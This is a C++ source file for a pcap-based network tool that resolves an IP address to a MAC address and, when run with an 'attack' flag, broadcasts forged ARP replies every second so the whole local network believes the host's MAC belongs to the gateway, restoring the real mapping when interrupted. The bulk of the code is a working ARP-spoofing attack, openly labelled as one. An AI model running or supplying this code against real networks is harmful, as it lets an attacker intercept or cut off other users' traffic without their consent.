#include <thread>
#include <chrono>
#include <atomic>
#include <signal.h>
#include "net.h"

DEFINE_string(ip, "", "ipv4 address, only used to choose adapter when in attack mode");
DEFINE_bool(attack, false, "attack whole network by pretending myself to be gateway");

std::atomic<bool> end_attack = false;
pcap_t *g_adhandle;
adapter_info g_apt_info;

void on_interrupt(int)
{
    end_attack = true;
}

int main(int argc, char* argv[])
{
    google::InitGoogleLogging(argv[0]);
    gflags::ParseCommandLineFlags(&argc, &argv, true);
    FLAGS_logtostderr = 1;
    FLAGS_minloglevel = 0;

    if (FLAGS_ip.size() <= 0) {
        LOG(ERROR) << "empty ipv4 address";
        return -1;
    }
    ip4_addr input_ip;
    try {
        input_ip = ip4_addr(FLAGS_ip);
    }
    catch (const std::runtime_error &e) {
        LOG(ERROR) << e.what();
        return -1;
    }

    g_apt_info = adapter_info(input_ip, false);
    if (g_apt_info.name.size() == 0) {
        LOG(ERROR) << "failed to find adapter according to " << input_ip;
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    if (!(g_adhandle= pcap_open(g_apt_info.name.c_str(), 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf)))
    {
        LOG(ERROR) << "failed to open the adapter";
        return -1;
    }

    if (FLAGS_attack) {
        if (g_apt_info.gateway == PLACEHOLDER_IPv4_ADDR) {
            LOG(ERROR) << "no valid gateway info: " << g_apt_info.gateway;
            return -1;
        }
        signal(SIGINT, on_interrupt); 
        LOG(INFO) << "lie to all that gateway " << g_apt_info.gateway << " is at " << g_apt_info.mac << "...";
        while (!end_attack) {
            send_arp(g_adhandle, ARP_REPLY_OP, g_apt_info.mac, g_apt_info.gateway, g_apt_info.mac, g_apt_info.ip);
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }
        LOG(INFO) << "lying stopped";
        eth_addr gateway_mac;
        if (ip2mac(g_adhandle, g_apt_info, g_apt_info.gateway, gateway_mac, 5000)) {
            if (send_arp(g_adhandle, ARP_REPLY_OP, gateway_mac, g_apt_info.gateway, g_apt_info.mac, g_apt_info.ip)) {
                LOG(INFO) << "finally tell the true that gateway is at " << gateway_mac;
            }
        }
    }
    else {
        eth_addr target_mac;
        if (ip2mac(g_adhandle, g_apt_info, input_ip, target_mac, 5000)) {
            std::cout << input_ip << " is at " << target_mac << "." << std::endl;
        }
    }
}